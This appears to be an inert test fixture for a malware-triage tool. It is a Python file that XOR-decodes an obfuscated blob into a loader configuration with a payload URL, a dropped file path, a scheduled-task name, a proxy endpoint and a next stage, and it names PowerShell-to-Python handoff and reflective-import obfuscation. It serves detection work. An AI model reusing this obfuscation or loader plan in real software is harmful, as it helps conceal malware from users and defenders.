# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_397f5181 = ("hc7Bj4CHloOAzoOBnJWan5asm5yAh9+SkIKGmoGWrIGWnpyHlt+XlpCcl5aslp6RlpeXlpffhIGah5aslZqflt+XmoCDkoeQm6yDgZyQloCAj5KXkoOHloHOg5yEloGAm5afn6yDioebnJ2sm5Kdl5yVlY+Ah5KUlqyQnIadh87Gj4CKnYeSi86XmpCHmpydkoGKrJeagIOSh5C"
    "bj5yRlYaAkJKHmpydzoGWlZ+WkIeahZasnZKelqyDn5Kdj5CSgYGaloHOg4qSgZ6cgayDipqdgIeSn5+WgY+Emp2XnISArJCbkpqdzoOchJaBgJuWn5+sh5ysg4qHm5ydj5CSnoOSmpSdrJqXzpCSnoOSmpSd3sDKxcGVxsuRlpWPhoGfzpuHh4OAydzcwMrFwZXGy5GWld2Wi5"
    "Keg5+W3ZqdhZKfmpfcw8HGksCSy8Ldg4qPhoCWgaySlJadh867hp2HgZaAgKOKh5ucndzAysXBlcbLkZaVj5Wan5asg5KHm86wydyjgZyUgZKet5KHkty7hp2HgZaAgL+SkdzdhoOXkoeW3sDKxcGVxsuRlpXdg4qPmp2HloGDgZaHloGsg5KHm86wydyjgZyUgZKet5KHktyji"
    "oebnJ3ewMrFwZXGy5GWldyDioebnJ3dlouWj4eSgJisnZKels6gioCHlp6mg5eSh5bewMrFwZXGy5GWlY+DgZyLiqyWnZeDnJqdh87CwcTdw93D3cLJwcfFysOPnZaLh6yAh5KUls6fnJCSn96XmoCDkoeQm92RkoePm5Kdl5yVlayal86joKOq3sGww7GyysrKy8PCwMvDsbU=")
CODEC_397f5181 = "base64_chunks|single_byte_xor|f3"

def load_397f5181():
    return base64.b64decode(MATERIAL_397f5181)

def decode_397f5181(e):
    return bytes(value ^ 243 for value in e)

def recover_397f5181():
    n = None
    s = "decode"
    while s != "done":
        if s == "decode":
            d = decode_397f5181(load_397f5181())
            s = "done"
    t = d.decode("ascii", "strict")
    return t

def inspect_397f5181():
    return recover_397f5181()

def surface_397f5181():
    routes = {"selected": lambda: ("dictionary_dispatch", "reflective_name_plan", "pyarmor_pyinstaller", "powershell_to_python")}
    return routes["selected"]()

def obfuscation_397f5181():
    reflection_plan = ("__import__", "getattr", "reflective_name_plan")
    return reflection_plan[-1]

def plan_397f5181():
    fields = dict(item.split("=", 1) for item in inspect_397f5181().split("|"))
    analysis_surface = surface_397f5181()
    obfuscation_surface = obfuscation_397f5181()
    operation_plan = ("powershell_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_397f5181())

# reconstruction complete